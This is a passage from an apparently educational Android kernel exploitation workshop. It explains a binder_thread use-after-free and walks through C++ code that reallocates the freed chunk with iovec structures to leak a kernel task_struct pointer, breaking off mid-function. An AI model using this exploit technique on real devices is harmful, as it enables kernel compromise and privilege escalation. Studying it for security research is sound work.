        <span class="token keyword">struct</span> <span class="token class-name">iovec</span> iovstack<span class="token punctuation">[</span>UIO_FASTIOV<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span>iov <span class="token operator">=</span> iovstack<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">iov_iter</span> iter<span class="token punctuation">;</span>
        ssize_t ret<span class="token punctuation">;</span>

        ret <span class="token operator">=</span> <span class="token function">import_iovec</span><span class="token punctuation">(</span>WRITE<span class="token punctuation">,</span> vec<span class="token punctuation">,</span> vlen<span class="token punctuation">,</span> <span class="token function">ARRAY_SIZE</span><span class="token punctuation">(</span>iovstack<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>iov<span class="token punctuation">,</span> <span class="token operator">&amp;</span>iter<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>ret <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
                ret <span class="token operator">=</span> <span class="token function">do_iter_write</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token operator">&amp;</span>iter<span class="token punctuation">,</span> pos<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<ul>
<li><code>writev</code> passes the pointer to <code>iovec</code> structure and <strong>number</strong> of <code>iovec</code> from user space to a function <code>do_writev</code></li>
<li><code>do_writev</code> passes the same information to another function <code>vfs_writev</code> with some additional parameters</li>
<li><code>vfs_writev</code> passes the same information to another function <code>import_iovec</code> with some additional parameters</li>
</ul>
<p>Let&apos;s open <code>workshop/android-4.14-dev/goldfish/lib/iov_iter.c</code> and look at the implementation of <code>import_iovec</code> function.</p>
<pre class="language-"><code class="lang-c"><span class="token keyword">int</span> <span class="token function">import_iovec</span><span class="token punctuation">(</span><span class="token keyword">int</span> type<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iovec</span> __user <span class="token operator">*</span> uvector<span class="token punctuation">,</span>
                 <span class="token keyword">unsigned</span> nr_segs<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> fast_segs<span class="token punctuation">,</span>
                 <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span><span class="token operator">*</span>iov<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">iov_iter</span> <span class="token operator">*</span>i<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
        ssize_t n<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span>p<span class="token punctuation">;</span>
        n <span class="token operator">=</span> <span class="token function">rw_copy_check_uvector</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> uvector<span class="token punctuation">,</span> nr_segs<span class="token punctuation">,</span> fast_segs<span class="token punctuation">,</span>
                                  <span class="token operator">*</span>iov<span class="token punctuation">,</span> <span class="token operator">&amp;</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
        <span class="token function">iov_iter_init</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> type<span class="token punctuation">,</span> p<span class="token punctuation">,</span> nr_segs<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span>iov <span class="token operator">=</span> p <span class="token operator">==</span> <span class="token operator">*</span>iov <span class="token operator">?</span> <span class="token constant">NULL</span> <span class="token operator">:</span> p<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<ul>
<li><code>import_iovec</code> passes the same information about <code>iovec</code> to another function <code>rw_copy_check_uvector</code> with some additional parameters</li>
<li>initializes the kernel <code>iovec</code> structure stack by calling <code>iov_iter_init</code></li>
</ul>
<p>Let&apos;s open <code>workshop/android-4.14-dev/goldfish/fs/read_write.c</code> and look at the implementation of <code>rw_copy_check_uvector</code> function.</p>
<pre class="language-"><code class="lang-c">ssize_t <span class="token function">rw_copy_check_uvector</span><span class="token punctuation">(</span><span class="token keyword">int</span> type<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iovec</span> __user <span class="token operator">*</span> uvector<span class="token punctuation">,</span>
                              <span class="token keyword">unsigned</span> <span class="token keyword">long</span> nr_segs<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> fast_segs<span class="token punctuation">,</span>
                              <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span>fast_pointer<span class="token punctuation">,</span>
                              <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span><span class="token operator">*</span>ret_pointer<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
        <span class="token keyword">unsigned</span> <span class="token keyword">long</span> seg<span class="token punctuation">;</span>
        ssize_t ret<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token operator">*</span>iov <span class="token operator">=</span> fast_pointer<span class="token punctuation">;</span>
        <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>nr_segs <span class="token operator">&gt;</span> fast_segs<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                iov <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span>nr_segs<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">iovec</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>iov<span class="token punctuation">,</span> uvector<span class="token punctuation">,</span> nr_segs<span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token operator">*</span>uvector<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span>
        <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
        ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>seg <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> seg <span class="token operator">&lt;</span> nr_segs<span class="token punctuation">;</span> seg<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">void</span> __user <span class="token operator">*</span>buf <span class="token operator">=</span> iov<span class="token punctuation">[</span>seg<span class="token punctuation">]</span><span class="token punctuation">.</span>iov_base<span class="token punctuation">;</span>
                ssize_t len <span class="token operator">=</span> <span class="token punctuation">(</span>ssize_t<span class="token punctuation">)</span>iov<span class="token punctuation">[</span>seg<span class="token punctuation">]</span><span class="token punctuation">.</span>iov_len<span class="token punctuation">;</span>
                <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">&gt;=</span> <span class="token number">0</span>
                    <span class="token operator">&amp;&amp;</span> <span class="token function">unlikely</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access_ok</span><span class="token punctuation">(</span><span class="token function">vrfy_dir</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&gt;</span> MAX_RW_COUNT <span class="token operator">-</span> ret<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        len <span class="token operator">=</span> MAX_RW_COUNT <span class="token operator">-</span> ret<span class="token punctuation">;</span>
                        iov<span class="token punctuation">[</span>seg<span class="token punctuation">]</span><span class="token punctuation">.</span>iov_len <span class="token operator">=</span> len<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                ret <span class="token operator">+=</span> len<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<ul>
<li><code>rw_copy_check_uvector</code> allocates <strong>kernel space</strong> memory and calculates the <strong>size</strong> of the allocation by doing <code>nr_segs*sizeof(struct iovec)</code><ul>
<li>here, <code>nr_segs</code> is equal to the count in <code>iovec</code> structure stack that we passed from <strong>user space</strong></li>
</ul>
</li>
<li>copies the <code>iovec</code> structure stack from <strong>user space</strong> to newly allocated <strong>kernel space</strong> by calling <code>copy_from_user</code> function.</li>
<li>validates whether <code>iov_base</code> pointer is valid by calling <code>access_ok</code> function.</li>
</ul>
<p>As you can see how <code>rw_copy_check_uvector</code> helps us to control desired <strong>kmalloc cache</strong></p>
<h2 id="leaking-task-struct-pointer">Leaking task_struct* </h2>
<p>Let&apos;s see the strategy to leak <code>task_struct</code> pointer which is stored in <code>binder_thread</code>. We will use <code>writev</code> system call this time as we want to achieve <strong>scoped read</strong> from <strong>kernel space</strong> to <strong>user space</strong>.</p>
<p>Size of <code>binder_thread</code> structure is equal to <code>408</code> bytes. If you know about <strong>SLUB</strong> allocator, you will know that <strong>kmalloc-512</strong> contains all the object whose size is <strong>greater</strong> than <strong>256</strong> but <strong>less than equal</strong> to <strong>512</strong> bytes. As the size of the <code>binder_thread</code> structure is <code>408</code> bytes, it will end up in <strong>kmalloc-512</strong> cache. </p>
<p>First we need to figure out how many <code>iovec</code> structure we need to stack up to reallocate <code>binder_thread</code> <strong>freed</strong> chunk.</p>
<pre class="language-"><code>gef&gt; p /d sizeof(struct binder_thread)
$4 = 408
gef&gt; p /d sizeof(struct iovec)        
$5 = 16
gef&gt; p /d sizeof(struct binder_thread) / sizeof(struct iovec)
$9 = 25
gef&gt; p /d 25*16
$16 = 400
</code></pre><p>We see that we will need to stack up <strong>25</strong> <code>iovec</code> structures to reallocate the <strong>dangling</strong> chunk.</p>
<blockquote>
<p><strong>Note</strong>: <strong>25</strong> <code>iovec</code> structures are <strong>400</strong> bytes in size. This is a good thing, otherwise <code>task_struct</code> pointer would also get clobbered and we would not be able to leak it.</p>
</blockquote>
<p>If you remember, when the <strong>unlink</strong> operation happened <strong>two</strong> <strong>quadwords</strong> where written to the <strong>dangling</strong> chunk. Let&apos;s figure out which <code>iovec</code> structures will be clobbered.</p>
<pre class="language-"><code class="lang-c">gef<span class="token operator">&gt;</span> p <span class="token operator">/</span>d <span class="token function">offsetof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">binder_thread</span><span class="token punctuation">,</span> wait<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">iovec</span><span class="token punctuation">)</span>
$<span class="token number">13</span> <span class="token operator">=</span> <span class="token number">10</span>
</code></pre>
<table>
<thead>
<tr>
<th>offset</th>
<th>binder_thread</th>
<th>iovecStack</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x00</td>
<td>...</td>
<td>iovecStack[0].iov_base = 0x0000000000000000</td>
</tr>
<tr>
<td>0x08</td>
<td>...</td>
<td>iovecStack[0].iov_len = 0x0000000000000000</td>
</tr>
<tr>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
<tr>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
<tr>
<td>0xA0</td>
<td>wait.lock</td>
<td>iovecStack[10].iov_base = m_4gb_aligned_page</td>
</tr>
<tr>
<td>0xA8</td>
<td>wait.head.next</td>
<td>iovecStack[10].iov_len = PAGE_SIZE</td>
</tr>
<tr>
<td>0xB0</td>
<td>wait.head.prev</td>
<td>iovecStack[11].iov_base = 0x41414141</td>
</tr>
<tr>
<td>0xB8</td>
<td>...</td>
<td>iovecStack[11].iov_len = PAGE_SIZE</td>
</tr>
<tr>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<p>As we can see from the above table, <code>iovecStack[10].iov_len</code> and <code>iovecStack[11].iov_base</code> will be clobbered.</p>
<p>So, we would want to process <code>iovecStack[10]</code>, block <code>writev</code> system call and then trigger the <strong>unlink</strong> operation. This will ensure that when <code>iovecStack[11].iov_base</code> is clobbered, we will resume the <code>writev</code> system call. Then finally, leak the content of the <code>binder_thread</code> chunk back to <strong>user space</strong> and read <code>task_struct</code> pointer from it.</p>
<p><strong>But, what&apos;s the importance of <code>m_4gb_aligned_page</code> in this case?</strong></p>
<p>Before doing the <strong>unlink</strong> operation, <code>remove_wait_queue</code> tries to acquire <strong>spin lock</strong>. If the value is not <code>0</code>, then the thread will keep on <strong>spinning</strong> and the <strong>unlink</strong> operation will never occur. As <code>iov_base</code> is a <strong>64 bit</strong> value, we want to ensure that lower <strong>32 bits</strong> is <code>0</code>. </p>
<blockquote>
<p><strong>Note:</strong> To effectively, use the <strong>blocking</strong> feature of <code>writev</code> system calls we will need at least two <strong>light weight processes</strong>.</p>
</blockquote>
<p>Let&apos;s build the attack plan to leak <code>task_struct</code> structure pointer</p>
<ul>
<li>create <code>pipe</code>, get the file descriptors and set the maximum buffer size to <code>PAGE_SIZE</code></li>
<li>link <code>eventpoll</code> wait queue to <code>binder_thread</code> wait queue</li>
<li><code>fork</code> the process<ul>
<li>parent process<ul>
<li>free the <code>binder_thread</code> structure</li>
<li>trigger <code>writev</code> system call and keep blocking</li>
<li>once <code>writev</code> system call resumes, it will process <code>iovecStack[11]</code> which is already clobbered due to <strong>unlink</strong> operation</li>
<li>read the pointer to <code>task_struct</code> from the leaked <strong>kernel space</strong> chunk</li>
</ul>
</li>
<li>child process<ul>
<li><code>sleep</code> to avoid race conditions</li>
<li>trigger the <strong>unlink</strong> operation</li>
<li>read dummy data from the <code>pipe</code> which is written by processing <code>iovecStack[10]</code>, this will resume <code>writev</code> system call</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>To better understand the flow of exploitation, let&apos;s see a diagram created by <strong>Maddie Stone</strong> on <strong>Project Zero</strong> blog post. The diagram is very accurate and I do not want to redraw the same.</p>
<p align="center">
  <img src="../images/task-struct-leak-exploitation-flow.png" alt="Task Struct Leak Exploitation Flow" title="Task Struct Leak Exploitation Flow">
</p>


<p>Now, let&apos;s see the how the same could be achieved in the exploit code.</p>
<pre class="language-"><code class="lang-cpp"><span class="token keyword">void</span> <span class="token class-name">BinderUaF</span><span class="token operator">::</span><span class="token function">leakTaskStruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> pipe_fd<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    ssize_t nBytesRead <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">static</span> <span class="token keyword">char</span> dataBuffer<span class="token punctuation">[</span>PAGE_SIZE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">iovec</span> iovecStack<span class="token punctuation">[</span>IOVEC_COUNT<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token keyword">nullptr</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Get binder fd</span>
    <span class="token comment">//</span>

    <span class="token function">setupBinder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Create event poll</span>
    <span class="token comment">//</span>

    <span class="token function">setupEventPoll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// We are going to use iovec for scoped read/write,</span>
    <span class="token comment">// we need to make sure that iovec stays in the kernel</span>
    <span class="token comment">// before we trigger the unlink after binder_thread has</span>
    <span class="token comment">// been freed.</span>
    <span class="token comment">//</span>
    <span class="token comment">// One way to achieve this is by using the blocking APIs</span>
    <span class="token comment">// in Linux kernel. Such APIs are read, write, etc on pipe.</span>
    <span class="token comment">//</span>

    <span class="token comment">//</span>
    <span class="token comment">// Setup pipe for iovec</span>
    <span class="token comment">//</span>

    <span class="token function">INFO</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Setting up pipe\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pipe</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">ERR</span><span class="token punctuation">(</span><span class="token string">&quot;\t[-] Unable to create pipe\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">INFO</span><span class="token punctuation">(</span><span class="token string">&quot;\t[*] Pipe created successfully\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// pipe_fd[0] = read fd</span>
    <span class="token comment">// pipe_fd[1] = write fd</span>
    <span class="token comment">//</span>
    <span class="token comment">// Default size of pipe is 65536 = 0x10000 = 64KB</span>
    <span class="token comment">// This is way much of data that we care about</span>
    <span class="token comment">// Let&apos;s reduce the size of pipe to 0x1000</span>
    <span class="token comment">//</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fcntl</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> F_SETPIPE_SZ<span class="token punctuation">,</span> PAGE_SIZE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">ERR</span><span class="token punctuation">(</span><span class="token string">&quot;\t[-] Unable to change the pipe capacity\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">INFO</span><span class="token punctuation">(</span><span class="token string">&quot;\t[*] Changed the pipe capacity to: 0x%x\n&quot;</span><span class="token punctuation">,</span> PAGE_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">INFO</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Setting up iovecs\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// As we are overlapping binder_thread with iovec,</span>
    <span class="token comment">// binder_thread-&gt;wait.lock will align to iovecStack[10].io_base.</span>
    <span class="token comment">//</span>
    <span class="token comment">// If binder_thread-&gt;wait.lock is not 0 then the thread will get</span>
    <span class="token comment">// stuck in trying to acquire the lock and the unlink operation</span>
    <span class="token comment">// will not happen.</span>
    <span class="token comment">//</span>
    <span class="token comment">// To avoid this, we need to make sure that the overlapped data</span>
    <span class="token comment">// should be set to 0.</span>
    <span class="token comment">//</span>
    <span class="token comment">// iovec.iov_base is a 64bit value, and spinlock_t is 32bit, so if</span>
    <span class="token comment">// we can pass a valid memory address whose lower 32bit value is 0,</span>
    <span class="token comment">// then we can avoid spin lock issue.</span>
    <span class="token comment">//</span>

    <span class="token function">mmap4gbAlignedPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    iovecStack<span class="token punctuation">[</span>IOVEC_WQ_INDEX<span class="token punctuation">]</span><span class="token punctuation">.</span>iov_base <span class="token operator">=</span> m_4gb_aligned_page<span class="token punctuation">;</span>
    iovecStack<span class="token punctuation">[</span>IOVEC_WQ_INDEX<span class="token punctuation">]</span><span class="token punctuation">.</span>iov_len <span class="token operator">=</span> PAGE_SIZE<span class="token punctuation">;</span>
    iovecStack<span class="token punctuation">[</span>IOVEC_WQ_INDEX <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>iov_base <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token number">0x41414141</span><span class="token punctuation">;</span>
    iovecStack<span class="token punctuation">[</span>IOVEC_WQ_INDEX <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>iov_len <span class="token operator">=</span> PAGE_SIZE<span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Now link the poll wait queue to binder thread wait queue</span>
    <span class="token comment">//</span>

    <span class="token function">linkEventPollWaitQueueToBinderThreadWaitQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// We should trigger the unlink operation when we</span>
    <span class="token comment">// have the binder_thread reallocated as iovec array</span>
    <span class="token comment">//</span>

    <span class="token comment">//</span>
    <span class="token comment">// Now fork</span>
    <span class="token comment">//</span>

    pid_t childPid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>childPid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">//</span>
        <span class="token comment">// child process</span>
        <span class="token comment">//</span>

        <span class="token comment">//</span>
        <span class="token comment">// There is a race window between the unlink and blocking</span>
        <span class="token comment">// in writev, so sleep for a while to ensure that we are</span>
        <span class="token comment">// blocking in writev before the unlink happens</span>
        <span class="token comment">//</span>

        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//</span>
        <span class="token comment">// Trigger the unlink operation on the reallocated chunk</span>
        <span class="token comment">//</span>

        <span class="token function">unlinkEventPollWaitQueueFromBinderThreadWaitQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//</span>
        <span class="token comment">// First interesting iovec will read 0x1000 bytes of data.</span>
        <span class="token comment">// This is just the junk data that we are not interested in</span>
        <span class="token comment">//</span>

        nBytesRead <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dataBuffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dataBuffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>nBytesRead <span class="token operator">!=</span> PAGE_SIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">ERR</span><span class="token punctuation">(</span><span class="token string">&quot;\t[-] CHILD: read failed. nBytesRead: 0x%lx, expected: 0x%x&quot;</span><span class="token punctuation">,</span> nBytesRead<span class="token punctuation">,</span> PAGE_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// parent process</span>
    <span class="token comment">//</span>

    <span class="token comment">//</span>
    <span class="token comment">// I have seen some races which hinders the reallocation.</span>
    <span class="token comment">// So, now freeing the binder_thread after fork.</span>
    <span class="token comment">//</span>

    <span class="token function">freeBinderThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// Reallocate binder_thread as iovec array</span>
    <span class="token comment">//</span>
    <span class="token comment">// We need to make sure this writev call blocks</span>
    <span class="token comment">// This will only happen when the pipe is already full</span>
    <span class="token comment">//</span>

    <span class="token comment">//</span>
    <span class="token comment">// This print statement was ruining the reallocation,</span>
    <span class="token comment">// spent a night to figure this out. Commenting the</span>
    <span class="token comment">// below line.</span>
    <span class="token comment">//</span>

    <span class="token comment">// INFO(&quot;[+] Reallocating binder_thread\n&quot;);</span>


    ssize_t nBytesWritten <span class="token operator">=</span> <span class="token function">writev</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> iovecStack<span class="token punctuation">,</span> IOVEC_COUNT<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//</span>
    <span class="token comment">// If the corruption was successful, the total bytes written</span>
    <span class="token comment">// should be equal to 0x2000. This is because there are two</span>
    <span class="token comment">// valid iovec and the length of each is 0x1000</span>
    <span class="token comment">//</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>nBytesWritten <span class="token operator">!=</span> PAGE_SIZE <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">ERR</span><span class="token punctuation">(</span><span class="token string">&quot;\t[-] writev failed. nBytesWritten: 0x%lx, expected: 0x%x\n&quot;</span><span class="token punctuation">,</span> nBytesWritten<span class="token punctuation">,</span> PAGE_SIZE <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">INFO</span><span class="token punctuation">(</span><span class="token string">&quot;\t[*] Wrote 0x%lx bytes\n&quot;</span><span class="token punctuation">,</span> nBytesWritten<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Now read the actual data from the corrupted iovec</span>
    <span class="token comment">// This is the leaked data from kernel address space</span>
    <span class="token comment">// and will contain the task_struct pointer</span>
    <span class="token comment">//</span>

    nBytesRead <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>pipe_fd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dataBuffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dataBuffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>nBytesRead <span class="token operator">!=</span> PAGE_SIZE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">ERR</span><span class="token punctuation">(</span><span class="token string">&quot;\t[-] read failed. nBytesRead: 0x%lx, expected: 0x%x&quot;</span><span class="token punctuation">,</span> nBytesRead<span class="token punctuation">,</span> PAGE_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//</span>
    <span class="token comment">// Wait for the child process to exit</span>
    <span class="token comment">//</span>

    <span class="token function">wait</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

